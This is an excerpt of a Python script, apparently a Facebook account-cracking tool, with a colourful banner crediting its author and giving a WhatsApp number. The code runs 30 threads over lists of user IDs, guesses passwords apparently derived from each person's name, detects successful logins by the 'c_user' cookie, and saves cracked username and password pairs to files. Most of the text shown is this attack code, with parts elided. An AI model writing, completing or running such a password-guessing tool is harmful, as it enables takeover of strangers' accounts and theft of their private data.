...
from concurrent.futures import ThreadPoolExecutor as mrAABAN
...
d888888b d8888b. db    db 
  `88'   88  `8D 88    88
   88    88oodD' 88    88 
   88    88~~~   88    88
  .88.   88      88b  d88
Y888888P 88      ~Y8888P'    \033

\033[1;35m💙💘✨____________💞💕❣️____________💘💝💕💓

  Auther   : AABAN MIRZA IPU FOUNDER
  \033[1;37mFacebook : AABAN MIRZA 
  \033[1;36mYoutube  : COMING SOON
  \033[1;37mNote     : PRIVATE TOLL
  \033[1;37mVersion  : 0.1
  \033[1;35mWhatsapp : +994404650258
...
def hasil(OK,cp):
	if not len(OK) != 0:
	    pass
	if len(cp) != 0:
	    print('\n\n  \x1b[1;97m Total OK : \x1b[1;97m %s  \x1b[1;97mAABAN_OK.txt' % (H, P, str(len(ok))))
	    print('  \x1b[1;97m Total CP :\x1b[1;97m   %s \x1b[1;97mAABAN_CP.txt' % (H, P, str(len(cp))))
	    input("\x1b[1;97mPress enter to back AABAN Menu ")
	    mr()
...
class __xxx__:
    ...
    def __metode__(self, user, __chi__, cebok):
        global ok,cp,loop
        sys.stdout.write(f"\r \x1b[1;97m[IPU] {loop}|{len(self.id)} \033[1;32m[ok][{len(ok)}] \033[1;31m[cp][{len(cp)}] ")
        sys.stdout.flush()
        try:
            for pw in __chi__:
                pw = pw.lower()
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    print(f"\r{H} [AABAN-OK] {user} | {pw}")
                    wrt = '%s|%s' % (user,pw)
                    ok.append(wrt)
                    open('AABAN_OK.txt' , 'a').write('%s\n' % wrt)
                    ...
                    try:
                        ...
                        print('\r%s [AABAN-CP] %s | %s ' % (M, user, pw))
                        wrt = '%s|%s' % (user,pw)
                        cp.append(wrt)
                        open('AABAN_CP.txt' , 'a').write('%s\n' % wrt)
                        break
    ...
    def __pler__(self):
        ...
        if chi == '':
            ...
            print(47*"-")
            with mrAABAN(max_workers=30) as AABANworld:
                for zsb in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        uid, name = zsb.split('|')
                        xz = name.split(' ')
